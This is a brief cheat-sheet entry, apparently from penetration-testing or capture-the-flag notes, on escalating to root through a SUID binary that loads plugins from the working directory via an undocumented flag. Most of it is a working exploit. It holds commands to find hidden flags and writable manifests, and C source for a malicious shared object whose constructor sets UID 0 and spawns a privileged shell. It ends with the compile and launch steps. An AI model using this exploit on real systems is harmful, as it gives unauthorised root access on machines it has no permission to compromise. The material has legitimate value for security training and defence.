# SUID Plugin Load from CWD (Undocumented Flag)

A root-SUID binary that loads plugins by filename, from a group-writable manifest, sometimes has an undocumented flag enabling that path. Check strings for anything not in `--help`.

```bash
strings /path/to/suid-binary | grep -- '--'   # look for undocumented flags
ls -la /path/to/plugin-manifest.json          # check if it's group/world-writable

# minimal malicious shared object: a constructor that runs on load
cat > exploit.c <<'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC exploit.c -o exploit.so

/path/to/suid-binary plugin exploit --undocumented-flag   # run from the dir holding exploit.so
```
